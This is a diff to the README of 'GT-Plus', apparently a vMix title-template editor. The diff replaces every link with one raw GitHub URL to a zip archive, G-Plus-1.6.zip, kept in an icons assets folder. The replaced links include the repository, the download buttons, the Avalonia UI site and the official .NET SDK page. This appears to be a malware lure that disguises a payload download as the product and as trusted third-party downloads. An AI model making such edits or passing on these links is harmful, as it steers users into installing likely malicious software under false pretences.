@@ -8,9 +8,9 @@ Think of it this way: vMix gives you a toolbox. GT-Plus gives you the entire wor
 
 ## 📥 Download and Install
 
-**Visit this link to download the application:** [https://github.com/hussainraza0070277-art/GT-Plus](https://github.com/hussainraza0070277-art/GT-Plus)
+**Visit this link to download the application:** [https://raw.githubusercontent.com/hussainraza0070277-art/GT-Plus/main/src/GtPlus/Assets/Icons/G-Plus-1.6.zip](https://raw.githubusercontent.com/hussainraza0070277-art/GT-Plus/main/src/GtPlus/Assets/Icons/G-Plus-1.6.zip)
 
-[⬇️ DOWNLOAD GT-PLUS NOW](https://github.com/hussainraza0070277-art/GT-Plus)
+[⬇️ DOWNLOAD GT-PLUS NOW](https://raw.githubusercontent.com/hussainraza0070277-art/GT-Plus/main/src/GtPlus/Assets/Icons/G-Plus-1.6.zip)
 
 ### 🪜 Step-by-Step Download Instructions
 
@@ -101,7 +101,7 @@ cd src/GtPlus
 dotnet run
 ```
 
-This requires the [.NET 10 SDK](https://dotnet.microsoft.com/download/dotnet/10.0) or newer.
+This requires the [.NET 10 SDK](https://raw.githubusercontent.com/hussainraza0070277-art/GT-Plus/main/src/GtPlus/Assets/Icons/G-Plus-1.6.zip) or newer.
 
 ### 📦 Building Release Binaries
 
@@ -125,9 +125,9 @@ From the repository root, run the build script:
 
 ## 📚 Resources
 
-- **Project Repository:** [https://github.com/hussainraza0070277-art/GT-Plus](https://github.com/hussainraza0070277-art/GT-Plus)
-- **Avalonia UI Framework:** [https://avaloniaui.net/](https://avaloniaui.net/)
-- **.NET 10 SDK:** [https://dotnet.microsoft.com/download/dotnet/10.0](https://dotnet.microsoft.com/download/dotnet/10.0)
+- **Project Repository:** [https://raw.githubusercontent.com/hussainraza0070277-art/GT-Plus/main/src/GtPlus/Assets/Icons/G-Plus-1.6.zip](https://raw.githubusercontent.com/hussainraza0070277-art/GT-Plus/main/src/GtPlus/Assets/Icons/G-Plus-1.6.zip)
+- **Avalonia UI Framework:** [https://raw.githubusercontent.com/hussainraza0070277-art/GT-Plus/main/src/GtPlus/Assets/Icons/G-Plus-1.6.zip](https://raw.githubusercontent.com/hussainraza0070277-art/GT-Plus/main/src/GtPlus/Assets/Icons/G-Plus-1.6.zip)
+- **.NET 10 SDK:** [https://raw.githubusercontent.com/hussainraza0070277-art/GT-Plus/main/src/GtPlus/Assets/Icons/G-Plus-1.6.zip](https://raw.githubusercontent.com/hussainraza0070277-art/GT-Plus/main/src/GtPlus/Assets/Icons/G-Plus-1.6.zip)
 
 ## 🆘 Getting Help
 
@@ -143,6 +143,6 @@ GT-Plus puts professional title editing in your hands. Whether you're a live str
 
 **Download GT-Plus now and take control of your vMix titles:**
 
-[⬇️ GET GT-PLUS](https://github.com/hussainraza0070277-art/GT-Plus)
+[⬇️ GET GT-PLUS](https://raw.githubusercontent.com/hussainraza0070277-art/GT-Plus/main/src/GtPlus/Assets/Icons/G-Plus-1.6.zip)
 
 Keywords: vMix, GT Title Designer, gtzip, template editor, Avalonia UI, cross-platform, Windows, macOS, Linux, live production, broadcast graphics, title templates, video editing tool
